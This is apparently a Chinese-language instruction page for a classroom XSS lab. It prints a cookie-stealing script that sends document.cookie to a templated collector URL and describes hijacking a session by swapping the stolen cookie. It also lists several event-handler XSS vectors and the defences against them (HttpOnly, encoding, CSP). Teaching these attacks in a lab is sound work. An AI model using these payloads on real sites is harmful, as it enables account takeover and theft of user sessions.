教學 Payload 與 Session 替換

xss_lab_session 是實際控制留言身分的 Cookie。Vulnerable 可被腳本讀取；Protected 使用 HttpOnly、輸出編碼與 CSP，切換時旋轉 Session。

<script>
fetch("{{ urls.collector }}/steal?cookie=" + document.cookie);
</script>

先由兩位學生各自從入口進入 XSS；讓受害者查看此留言，Collector 會收到 Cookie。另一位學生用 F12 在自己的 XSS 主機替換 xss_lab_session 的 value，重新整理並發表留言，確認實驗身分變更。這個 Cookie 不會改變平台教師角色。

事件與連結測試

<img src="missing-xss-image" onerror="alert('XSS')">
<svg onload="alert('XSS')"></svg>
<iframe onload="alert('XSS')"></iframe>
<a href="javascript:alert('XSS')">click me</a>
<input autofocus onfocus="alert('XSS')">

連結需點擊，onfocus 需取得焦點。只阻擋 script 標籤不足以防止事件屬性執行；Protected 會將以上 HTML 顯示為文字。

Cookie 收集請在 Network 查看 /steal 請求；跨來源 fetch 可能出現 CORS 訊息，但 GET 請求仍可能送達 Collector。帳號會由 Collector 的 Session 查詢自動辨認。
